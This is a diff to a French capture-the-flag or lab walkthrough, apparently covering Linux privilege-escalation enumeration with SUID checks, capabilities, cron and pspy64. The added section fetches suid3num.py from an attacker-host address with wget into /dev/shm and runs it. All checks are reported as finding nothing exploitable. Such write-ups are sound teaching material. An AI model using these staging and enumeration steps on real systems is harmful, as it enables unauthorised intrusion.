@@ -238,6 +238,7 @@ La liste obtenue ne contient que des binaires système classiques tels que :
 /usr/bin/chfn
 /usr/bin/sudo
 /usr/bin/newgrp
+...
 ```
 
 Tu n’identifies aucun binaire inhabituel ou directement exploitable.
@@ -253,6 +254,28 @@ getcap -r / 2>/dev/null
 ```
 
 Ici, tu ne trouves aucune capability inhabituelle ni aucun binaire exploitable.
+
+### Vérification des SUID avec suid3num.py
+
+Pour compléter l’analyse des binaires SUID, tu utilises l’outil suid3num.py, qui permet d’identifier rapidement :
+
+les binaires SUID intéressants
+leur présence éventuelle dans GTFOBins
+
+Tu le télécharges et l’exécutes depuis un répertoire en mémoire (/dev/shm) :
+
+```bash
+cd /dev/shm
+wget http://10.10.x.x:8000/suid3num.py
+python3 suid3num.py
+```
+L’outil confirme que :
+
+- tous les binaires SUID présents sont standards
+- aucun binaire personnalisé n’est identifié
+- aucun binaire exploitable via GTFOBins n’est détecté
+  
+Cette vérification confirme que la piste des SUID ne mène à rien dans ce cas précis.
 
 ### Inspection des tâches cron
 Tu vérifies ensuite les **tâches planifiées (cron)**, car certains scripts exécutés automatiquement par le système peuvent être modifiables par un utilisateur et permettre une élévation de privilèges.
@@ -272,9 +295,6 @@ netstat -tulpn
 
 ### pspy64
 Tu lances également pspy64 dans une deuxième session SSH afin d’observer en temps réel les processus exécutés sur la machine, notamment ceux lancés par root.
-
-cd /tmp
-./pspy64
 
 L’objectif est de repérer d’éventuelles tâches cron, scripts ou commandes exécutés automatiquement par root et qui pourraient être exploitables pour une escalade de privilèges.
 
